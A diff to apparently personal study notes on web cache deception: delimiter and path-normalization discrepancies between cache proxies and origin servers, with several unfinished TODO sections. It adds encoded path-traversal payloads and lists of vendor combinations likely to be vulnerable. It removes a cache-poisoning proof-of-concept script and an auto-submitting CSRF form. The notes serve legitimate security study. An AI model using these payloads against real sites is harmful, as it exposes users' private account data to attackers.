@@ -21,14 +21,17 @@ Delimiter     : A character or string that separates the path from the query str
 
 # Detecting Origin Delimiters 
 1. Identify a `non-cacheable` request 
-In this case we hope that what is appended is ignored by the frontend server and makes it to the backend server.
+In this case we hope that what is appended is ignored by the frontend server and makes it to the origin server.
 2. Send the same request appending a random suffix at the end of the path 
-> abc / ? # % ; %2F %00 %0a %09 %20
+> abc / ? # % ; %2F %00 %0a %09 %20 %3B 
+> %3Fname=valnonexistent.css
+[Concept of a Path Parameter](Cached and Confused) : /<random>.css
 3. Send the same request appending a delimiter before the random suffix at the end of the path 
-> abc / ? # % ; %2F %00 %0a %09 %20
+> abc / ? # % ; %2F %00 %0a %09 %20 %3B
+> %3Fname=valnonexistent.css
 If the responses are identical, the character or string is used as a delimiter.
 Use Burp Intruder 
-# & URL delimiters in the real world 
+## & = URL delimiter in the real world (URL RFCs)
 ## CVE from web framework(bottle) using ; as delimiter 
 [Python Bottle delimiter](https://security.snyk.io/vuln/SNYK-PYTHON-BOTTLE-1017108)
 [Open Source Packages](https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages)
@@ -37,14 +40,14 @@ Use Burp Intruder
 What does a `delimiter` mean or does exactly? 
 The delimiter is a character, that when the url parser reaches it,
 a logical stop in parsing is decided there whatever character/s that follows
-at character is considered as not part of the URL.
+that character is considered as not part of the URL path
 
 # Why is this Important? 
 Identifying and using the delimiter allows to essentially coerce the parser to stop parsing at an 
 arbitrary section of the URL that we want. 
-See where this is going? Meaning we can smuggle a payload to the other URL parser or pass the the cache server. 
+See where this is going? Meaning we can smuggle a payload to the other URL parser or pass the cache server. 
 In this case we are talking about the Origin Server i.e the application server or servers like nginx, apache, 
-etc not the frontend cache server like cloudflare, etc.
+etc not the cache servers like cloudflare, etc.
 
 # Detecting Cache Delimiters 
 Cache servers often don't use delimiters aside from `?`
@@ -86,6 +89,7 @@ cache buster) to a known path, then send the same message with a path traversal 
 # Normalization discrepancies
 The following tables illustrate how different HTTP servers and web cache proxies normalize the
 path `/hello/..%2Fworld`. Some resolve the path to /world, while others don't normalize it at all.
+TO DO
 
 # Exploiting Web Cache Deception 
 ## Static file extensions / URL Mapping discrepancies
@@ -105,10 +109,18 @@ Cache Proxy                   Origin Server
 > /myAccount%23a.css          /myAccount#a.css 
 
 Sometimes the Cache Proxy/LB/Frontend Server decodes the URL before forwarding to the Origin Server
+A this point you should be aware of which components behaves in which ways based on
+prior research probes in detecting path normalization 
 Load Balancer:              /myAccount%25%32%33a.css 
 Cache Proxy:                /myAccount%23a.css  
 Origin Server:              /myAccount#a.css 
 If you are sending # in the browser, you need to encode it. Browsers don't send fragments to servers
+
+# Weaponizing Intermediary decoding/normalization
+Prerequisite: Intermediary decoding/normalization 
+Ex: Browsers won't send #<whatever> to the server but will
+happily send $23<whatever> to the server 
+TODO - see gotta cache'em all p9
 
 # Static directories
 Eg: Where to find them
@@ -124,11 +136,15 @@ Tip: Check your browser network tap for cached files/request responses.
 ```
 
 # Exploiting static directories with delimiters
+Prerequisites: 
+1. Origin Only recognized delimiter
+2. Cache normalization 
+3. Static routes caching rule in place
 If a char is used as a `delimiter` by the Origin Server but not by the cache server and the 
 cache server normalizes the path before applying a static directory rule, 
 you can hide a path traversal segment after the `delimiter`, which the cache will resolve:
 
-> GET /<DynamicResource><Delimiter><EncodedDotSegment><StaticDirectory>
+> GET /<DynamicResource><OriginOnlyDelimiter><EncodedDotSegment><StaticDirectory>
 CP normalizes req, applying the path traversal so it sees `/static/any` 
 Origin Server uses `$` as `delimiter` so it ignores `$/..%2Fstatic/any` and serves `/myAccount`
 CP applying static directory rules caches `/myAccount` as `/static/any` 
@@ -136,8 +152,17 @@ Browser                          Cache Proxy      Origin Server
 > /myAccount$/..%2Fstatic/any    /static/any      /myAccount
 
 Remember to test the behavior of the CP 
+Tip: Which CP does normalization? refer to the CP normalization table 
+so you can make an educated guess before you start testing 
+1. CloudFront
+2. Microsoft Azure 
+3. Imperva
 
 # Exploiting static directories through Backend only normalization
+Prerequisites:
+1. Origin Server normalizes path
+2. Cache Server doesn't normalize path
+3. Static routes caching rule in place
 The Origin Server normalizes the path before mapping the endpoint but the 
 cache doesn't normalize the path before evaluating the cache rules, 
 You can add a path traversal segment that will only be processed by the Origin Server:
@@ -149,21 +174,46 @@ CP caches response thinking it is under `/static/`
 Browser                   Cache Proxy                 Origin Server
 > /static/..%2FmyAccount  /static/..%2FmyAccount      /myAccount
 
+Remember to test the behavior of the CP 
+Tip: Which CP does normalization? refer to the CP normalization table 
+so you can make an educated guess before you start testing 
+Cache Proxies that don't Normalize paths  
+1. Cloudflare
+2. Google Cloud
+3. Fastly 
+Origin Server that Normalize paths
+1. Nginx
+2. Microsoft IIS 
+3. OpenLiteSpeed
+
+TO DO
+Create an extended table of cache + origin -> wcd (Vulnerable Combinations)
+Can be fed to the algorithm detection modules
+Note: A normalization discrepancy arises when combining Microsoft IIS with 
+any web cache that doesn't convert backlashes
+> /static/..%5CmyAccount /static/..\myAccount → /myAccount 
+
 # Real world Exploit normalization
 https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html
 %2F..%2F
 
 # Static files
-Some files, like /robots.txt, /favicon.ico, and /index.html, 
+Files, like /robots.txt, /favicon.ico, and /index.html, 
 
 # Exploiting static files
+Prerequisites:
+1. Cache Server normalize path
+2. Origin Server doesn't normalizes path
+3. Static file caching rule in place
+4. Origin Only delimiter
 Use the technique used in static directories where
-the CP normalizes the req and there is a delimiter at backend. 
+the CP normalizes the req and there is a delimiter at the backend. 
 The static directory is replaced by the filename and a cache buster
 
-> GET /<DynamicResource><Delimiter><EncodedDotSegment><Static_File>
-Browser                         Cache Proxy     Origin Server
-> /myAccount/..%2Frobots.txt      /robots.txt     /myAccount
+> GET /<DynamicResource><OriginOnlyDelimiter><EncodedDotSegment><Static_File>
+Request                         Cache Proxy ses     Origin Server sees
+> /myAccount/..%2Frobots.txt    /robots.txt         /myAccount
+
 
 # Understanding Our Cache and the Web Cache Deception Attack
 https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/
@@ -295,67 +345,8 @@ MID
 PLS  
 TAR  
 XLSX  
-
-# LYST Web Cache Poisoning POC Script 
-https://hackerone.com/reports/631589
-
-<html>
-  <head> </head>
-  <body>
-    <script>
-      var cachedUrl = "https://www.lyst.com/" + generateId() + ".css";
-      const popup = window.open(cachedUrl);
-      function generateId() {
-        var content = "";
-        const alphaWithNumber = "QWERTZUIOPASDFGHJUKLYXCVBNM1234567890";
-        for (var i = 0; i < 10; i++) {
-          content += alphaWithNumber.charAt(
-            Math.floor(Math.random() * alphaWithNumber.length)
-          );
-        }
-        return content;
-      }
-      var checker = setInterval(function () {
-        if (popup.closed) {
-          clearInterval(checker);
-        }
-      }, 200);
-      var closer = setInterval(function () {
-        popup.close();
-        document.body.innerHTML =
-          'Victims content is now cached <a href="' +
-          cachedUrl +
-          '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' +
-          cachedUrl +
-          "</b>";
-        clearInterval(closer);
-      }, 3000);
-    </script>
-  </body>
-</html>
-
-
-https://zhero-web-sec.github.io/cache-deception-to-csrf/
-Web Cache Deception CSRF form 
-<html>
-    <form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="https://www.nope.com/nope">
-        <table>
-            <tr><td>firstname</td><td><input type="text" value="zhero" name="firstname"></td></tr>
-            <tr><td>lastname</td><td><input type="text" value="powned" name="lastname"></td></tr>
-            <tr><td>address1</td><td><input type="text" value="8 rue test" name="address1"></td></tr>
-            <tr><td>address2</td><td><input type="text" value="test" name="address2"></td></tr>
-            <tr><td>postcode</td><td><input type="text" value="44000" name="postcode"></td></tr>
-            <tr><td>city</td><td><input type="text" value="Nantes" name="city"></td></tr>
-            <tr><td>id_country</td><td><input type="text" value="10" name="id_country"></td></tr>
-            <tr><td>id_state</td><td><input type="text" value="124" name="id_state"></td></tr>
-            <tr><td>phone_mobile</td><td><input type="text" value="2342342342" name="phone_mobile"></td></tr>
-            <tr><td>alias</td><td><input type="text" value="sdfsdfsdfsdf" name="alias"></td></tr>
-            <tr><td>token</td><td><input type="text" value="b1a437c8d5d36fc6cd189e3aa849798e" name="token"></td></tr>
-            <tr><td>submitAddress</td><td><input type="text" value="" name="submitAddress"></td></tr>
-        </table>
-    </form>
-    <script>
-        document.getElementById('csrf').submit()
-    </script>
-</html>
 ```
+
+# Real world exploits
+https://hackerone.com/reports/631589
+https://zhero-web-sec.github.io/cache-deception-to-csrf/
